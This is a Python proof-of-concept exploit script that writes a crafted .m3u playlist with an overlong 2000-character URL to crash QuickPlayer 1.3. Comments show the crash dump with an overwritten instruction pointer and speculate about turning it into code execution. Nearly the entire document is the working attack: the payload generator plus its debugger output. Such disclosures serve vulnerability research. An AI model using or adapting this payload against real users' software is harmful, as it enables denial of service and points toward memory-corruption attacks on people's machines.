#!/usr/bin/python
# QuickPlayer 1.3 [.m3u] url handling DOS
#This python script will generate an bad.m3u file that when 
#imported into QuickPlayer results in a crash.(Playlist->File->Load 
List)
#The vulnerability resides in failure to handle overly long urls.
#Debug output:
#              
----------------------------------------------------------------
#              Exception C0000096 (PRIVILEGED_INSTRUCTION)
#              
----------------------------------------------------------------
#              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? 
?? ??
#              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? 
?? ??
#              ECX=00410041: EC 83 EC 0C 56 8B F1 57-8D 45 FC 8D 7E 08 
50 8B
#              EDX=7C9037D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 
00 00
#              ESP=0011FFD0: BF 37 90 7C B8 00 12 00-70 E2 12 00 CC 00 
12 00
#              EBP=0011FFF0: A0 00 12 00 8B 37 90 7C-B8 00 12 00 70 E2 
12 00
#              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? 
?? ??
#              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? 
?? ??
#              EIP=00410041: EC 83 EC 0C 56 8B F1 57-8D 45 FC 8D 7E 08 
50 8B
#                            --> IN AL,DX
#              
----------------------------------------------------------------
#Some control over the eip there :P.
#At the moment it is not clear to me if it can be leveraged to an 
arbitrary code 
#execution vulnerability.I tried a few tricks,but i am too lazy,so...
#QuickPlayer: http://www.mjm.at.ua/
#
#Found by: Shinnok raydenxy [at] yahoo dot com
m3u = 'http://127.0.0.1/'
badstr = 'A' * 2000
m3u += badstr
m3u += '.mp3'

f = open('bad.m3u','wb')
f.write(m3u);
f.close


